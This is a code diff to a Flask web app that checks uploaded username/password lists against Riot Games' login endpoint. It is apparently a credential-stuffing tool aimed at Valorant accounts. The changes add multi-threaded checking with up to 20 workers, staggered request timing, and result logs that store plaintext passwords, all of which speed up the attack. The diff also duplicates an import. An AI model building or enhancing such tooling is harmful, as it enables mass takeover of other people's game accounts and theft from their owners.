@@ -13,11 +13,14 @@ import requests
 import time
 import json
 import threading
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from typing import Dict, List, Tuple, Optional
 import logging
 import os
 from werkzeug.utils import secure_filename
 import uuid
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import queue
 
 app = Flask(__name__)
 app.secret_key = 'valorant_combo_checker_secret_key_' + str(uuid.uuid4())
@@ -37,15 +40,20 @@ MAX_RETRIES = 3
 USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
 VALORANT_AUTH_URL = "https://auth.riotgames.com/api/v1/authorization"
 
+# Multi-threading settings
+DEFAULT_MAX_WORKERS = 5
+MAX_WORKERS_LIMIT = 20
+
 # Global storage for active sessions
 active_sessions = {}
 
 class ComboChecker:
-    """Core combo checking functionality"""
+    """Core combo checking functionality with multi-threading support"""
     
-    def __init__(self, session_id: str, delay: float = 2.0):
+    def __init__(self, session_id: str, delay: float = 2.0, max_workers: int = DEFAULT_MAX_WORKERS):
         self.session_id = session_id
         self.delay = delay
+        self.max_workers = min(max_workers, MAX_WORKERS_LIMIT)
         self.session = requests.Session()
         self.session.headers.update({
             'User-Agent': USER_AGENT,
@@ -56,6 +64,8 @@ class ComboChecker:
         self.stop_checking = False
         self.results = []
         self.progress = {'current': 0, 'total': 0}
+        self.results_lock = threading.Lock()
+        self.progress_lock = threading.Lock()
         
     def check_single_combo(self, username: str, password: str) -> Dict:
         """Check a single username/password combination"""
@@ -136,29 +146,83 @@ class ComboChecker:
         return None
     
     def check_combo_list(self, combos: List[Tuple[str, str]]):
-        """Check a list of username/password combinations"""
+        """Check a list of username/password combinations using multi-threading"""
         self.is_checking = True
         self.stop_checking = False
         self.results = []
         self.progress = {'current': 0, 'total': len(combos)}
         
-        for i, (username, password) in enumerate(combos):
-            if self.stop_checking:
-                break
+        # Create thread pool for parallel processing
+        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
+            # Submit all tasks
+            future_to_combo = {}
+            
+            for i, (username, password) in enumerate(combos):
+                if self.stop_checking:
+                    break
+                    
+                future = executor.submit(self._check_combo_with_delay, username, password, i)
+                future_to_combo[future] = (username, password, i)
+            
+            # Process completed tasks as they finish
+            for future in as_completed(future_to_combo):
+                if self.stop_checking:
+                    # Cancel remaining futures
+                    for f in future_to_combo:
+                        f.cancel()
+                    break
                 
-            self.progress['current'] = i + 1
-            
-            result = self.check_single_combo(username, password)
-            self.results.append(result)
-            
-            if i < len(combos) - 1 and not self.stop_checking:
-                time.sleep(self.delay)
+                try:
+                    result = future.result()
+                    
+                    # Thread-safe result storage
+                    with self.results_lock:
+                        self.results.append(result)
+                    
+                    # Thread-safe progress update
+                    with self.progress_lock:
+                        self.progress['current'] = len(self.results)
+                        
+                except Exception as e:
+                    # Handle any errors in individual threads
+                    username, password, _ = future_to_combo[future]
+                    error_result = {
+                        'username': username,
+                        'password': password,
+                        'status': 'error',
+                        'message': f'Thread error: {str(e)}',
+                        'timestamp': time.time()
+                    }
+                    
+                    with self.results_lock:
+                        self.results.append(error_result)
+                    
+                    with self.progress_lock:
+                        self.progress['current'] = len(self.results)
                 
         self.is_checking = False
+    
+    def _check_combo_with_delay(self, username: str, password: str, index: int) -> Dict:
+        """Check a single combo with smart delay management for threading"""
+        # Stagger the start times to avoid overwhelming the server
+        if index > 0:
+            # Add a small random delay based on thread index to spread out requests
+            thread_delay = (index % self.max_workers) * (self.delay / self.max_workers)
+            time.sleep(thread_delay)
+        
+        result = self.check_single_combo(username, password)
+        
+        # Apply the main delay between requests (but not for the first batch)
+        if index >= self.max_workers:
+            time.sleep(self.delay)
+            
+        return result
     
     def stop_checking_process(self):
         """Stop the current checking process"""
         self.stop_checking = True
+        # Give some time for threads to finish gracefully
+        time.sleep(0.5)
 
 def allowed_file(filename):
     """Check if file extension is allowed"""
@@ -251,9 +315,14 @@ def upload_file():
 
 @app.route('/api/start_batch', methods=['POST'])
 def start_batch():
-    """API endpoint to start batch checking"""
+    """API endpoint to start batch checking with multi-threading"""
     data = request.get_json()
     delay = float(data.get('delay', 2.0))
+    max_workers = int(data.get('max_workers', DEFAULT_MAX_WORKERS))
+    
+    # Validate max_workers
+    max_workers = min(max_workers, MAX_WORKERS_LIMIT)
+    max_workers = max(max_workers, 1)
     
     if 'uploaded_file' not in session:
         return jsonify({'error': 'No file uploaded'}), 400
@@ -266,7 +335,7 @@ def start_batch():
         combos = parse_combo_file(file_path)
         session_id = str(uuid.uuid4())
         
-        checker = ComboChecker(session_id, delay)
+        checker = ComboChecker(session_id, delay, max_workers)
         active_sessions[session_id] = checker
         
         # Start checking in background thread
@@ -281,7 +350,8 @@ def start_batch():
         return jsonify({
             'success': True,
             'session_id': session_id,
-            'total_combos': len(combos)
+            'total_combos': len(combos),
+            'max_workers': max_workers
         })
         
     except Exception as e:
